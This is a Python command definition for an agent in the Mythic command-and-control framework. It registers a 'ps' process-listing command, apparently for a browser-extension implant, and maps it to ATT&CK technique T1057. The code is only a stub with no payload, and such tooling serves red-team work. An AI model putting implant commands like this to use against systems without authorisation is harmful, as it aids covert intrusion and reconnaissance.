from mythic_container.MythicCommandBase import *


class PsArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = []

    async def parse_arguments(self):
        return


class PsCommand(CommandBase):
    cmd = "ps"
    needs_admin = False
    help_cmd = "ps"
    description = "List processes through the native messaging host."
    version = 1
    author = "@kingofthenops"
    attackmapping = ["T1057"]
    argument_class = PsArguments
    supported_ui_features = ["process_browser:list"]
    browser_script = BrowserScript(
        script_name="ps", author="@kingofthenops", for_new_ui=True
    )
    attributes = CommandAttributes(spawn_and_injectable=False)

    async def create_go_tasking(self, taskData: PTTaskMessageAllData) -> PTTaskCreateTaskingMessageResponse:
        return PTTaskCreateTaskingMessageResponse(
            TaskID=taskData.Task.ID,
            Success=True,
            DisplayParams="",
        )

    async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
        return PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
